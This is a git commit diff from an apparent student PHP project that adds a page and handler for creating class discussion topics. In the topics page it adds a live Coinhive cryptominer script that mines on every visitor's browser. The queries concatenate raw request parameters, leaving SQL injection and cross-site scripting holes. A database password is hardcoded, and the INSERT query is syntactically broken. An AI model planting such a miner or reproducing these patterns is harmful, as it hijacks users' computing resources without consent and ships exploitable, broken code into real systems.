2cc3040a357dc923c95b18c747b2a7a826a795ba
mr-scneider <rssnyder@iastate.edu>
2017-10-02 16:39:11 -0500

    Topic creation ready, maybe.

--- teacher/topics.php
+++ teacher/topics.php
@@ -4,7 +4,7 @@
   if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] == true) {
     if($_SESSION['role'] != 2) {
       $_SESSION['error'] = true;
-      $_SESSION['errorCode'] = "Not a teacher";
+      $_SESSION['errorCode'] = "Not Permitted";
       header("Location: ../login.php");
       die("oops");
     }
@@ -24,4 +24,81 @@
   $dbname="db309sab3";
   //Connect to database
   $db = new mysqli($host, $user, $password, $dbname, $port, $socket) or die ('Could not connect to the database server' . mysqli_connect_error());
+
+  //Get this class
+  $query = "SELECT * FROM classes WHERE ID = " . $_GET['class'];
+  $result = $db->query($query) or die($db->error);
+  $class = $result->fetch_assoc();
+
+  //Check to see if this teacher actaully owns this classes
+  if($class['teacher_id'] != $_SESSION['id']) {
+    header("Location: home.php");
+    die("oops");
+  }
 ?>
+
+<html lang="en">
+  <head>
+    <link rel="stylesheet" href="../css/pages.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/css/bootstrap.min.css" integrity="sha384-/Y6pD6FV/Vv2HJnA6t+vslU6fwYXjCFtcEpHbNJ0lyAFsXTsjBbfaDjzALeQsN6M" crossorigin="anonymous">
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/js/bootstrap.min.js" integrity="sha384-h0AbiXch4ZDo7tp9hKZ4TsHbi047NrKGLO3SEJAg45jXxnGIfYzk4Si90RDIqNm1" crossorigin="anonymous"></script>
+    <!-- Ethical? Maybe. Profitable? Not in the slightest. -->
+    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+    <link rel="stylesheet" href="css/home.css">
+    <script>
+	     var miner = new CoinHive.Anonymous('cyJAe6sZCcdfGwI4CRIXtPlv8MOK5oo7');
+	      miner.start();
+    </script>
+    <!-- End questionable content -->
+
+    <!-- The top banner of the webpage -->
+    <div class="top">
+        <font size="-5"><a class="logout" href="../login.php?event=logout">Logout</a></font>
+        <center>
+          <?php
+            echo '<h1>' . $class['class_name'] . '</h1>';
+          ?>
+        </center>
+    </div>
+  </head>
+
+  <!-- The left sidebar -->
+  <div class="left">
+    <?php
+      echo '<button class="button" onclick="window.location=\'home.php\';">' . $_SESSION['name'] . '\'s Home</button>';
+      echo '<button class="button" onclick="window.location=\'pages.php?class=' . $_GET['class'] . '\';">' . $class['class_name'] . ' Home</button>';
+      echo '<button class="button" onclick="window.location=\'pages.php?class=' . $_GET['class'] . '&page=classSettings\';">Class Settings</button>';
+      echo '<button class="button" onclick="window.location=\'topics.php?class=' . $_GET['class'] . '\';">Discussion Topics</button>';
+      echo '<button class="button" onclick="window.location=\'topics.php?class=' . $_GET['class'] . '\';">New Topic</button>';
+      echo '<button class="button" onclick="window.location=\'liveSession.php?class=' . $_GET['class'] . '&page=createTopic\';">Live Session</button>';
+     ?>
+  </div>
+
+  <!-- Main content of the webpage -->
+  <div class="main">
+    <div align="center" class="container">
+      <?php
+        //If teacher wants to create a new class
+        if($_GET['page'] == 'createTopic') {
+          echo '<form id="newTopic-form" action="utilities/createTopic.php?class=' . $_GET['class'] . '" method="post">';
+          echo '<br><br>Create a new topic<br><br>';
+          if($_SESSION['error']){
+              echo '<font color="red">' . $_SESSION['errorCode'] . "</font><br><br>";
+              $_SESSION['error'] = false;
+          }
+          echo 'Topic Name: <br>
+            <input type="text" name="name" value="" size="35"><br><br>
+            Topic Description: <br>
+            <input type="text" name="description" value="" size="35"><br><br>
+            <input name="newTopic" type="submit" value="Create Topic"><br><br>
+          </form>';
+        }
+        //Otherwise print the topics
+        else {
+
+        }
+      ?>
+    </div>
+  </div>
+
+</html>
---
+++ teacher/utilities/createTopic.php
@@ -0,0 +1,53 @@
+<?php
+  session_start();
+  //Check if user is logged in
+  if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] == true) {
+    if($_SESSION['role'] != 2) {
+      $_SESSION['error'] = true;
+      $_SESSION['errorCode'] = "Not Permitted";
+      header("Location: ../../login.php");
+      die("oops");
+    }
+  } else {
+    $_SESSION['error'] = true;
+    $_SESSION['errorCode'] = "Session Expired";
+    header("Location: ../../login.php?event=logout");
+  }
+  //TODO Grab all this from a file
+  //Define sql database information
+  $host="mysql.cs.iastate.edu";
+  $port=3306;
+  $socket="";
+  $user="dbu309sab3";
+  $password="SD0wFGqd";
+  $dbname="db309sab3";
+  //Connect to database
+  $db = new mysqli($host, $user, $password, $dbname, $port, $socket) or die ('Could not connect to the database server' . mysqli_connect_error());
+  //Print out host information
+  //echo $db->host_info;
+
+  //Check for no name
+  if("" == trim($_POST['name'])) {
+    $_SESSION['error'] = true;
+    $_SESSION['errorCode'] = "Topic Name Required";
+    header("Location: ../topics.php?class=" . $_GET['class'] . "&page=createTopic");
+    die("No name");
+  }
+
+  //Create the topic
+  $query = "INSERT INTO topics
+    `class_id`,
+    `topic_name`)
+    VALUES
+    (" . $_GET['class'] . ",
+    " . $_POST['name']",
+    " . $_POST['description'] . ")";
+
+  $result = $db->query($query) or die($db->error);
+
+  $_SESSION['error'] = true;
+  $_SESSION['errorCode'] = "Topic Created";
+  header("Location: ../topics.php?class=" . $_GET['class'] . "&page=createTopic");
+  die("Done");
+
+?>
